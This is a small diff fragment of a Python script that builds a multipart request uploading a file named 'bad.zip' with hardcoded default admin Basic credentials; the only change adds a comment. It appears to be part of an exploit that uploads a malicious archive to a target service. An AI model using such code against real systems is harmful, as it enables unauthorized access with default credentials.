@@ -21,6 +21,7 @@ def build_zip():
 def upload_zip():
     boundary = "---------------------------ardias"
     header = {'Content-Type':f'multipart/form-data; boundary={boundary}', 'Authorization':'Basic YWRtaW46YWRtaW4='}
+    # Boundary Checked
     payload = f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"bad.zip\"\r\nContent-Type: application/zip\r\n\r\n"
     with open('bad.zip', 'rb') as f:
         payload += f.read().decode('latin1')
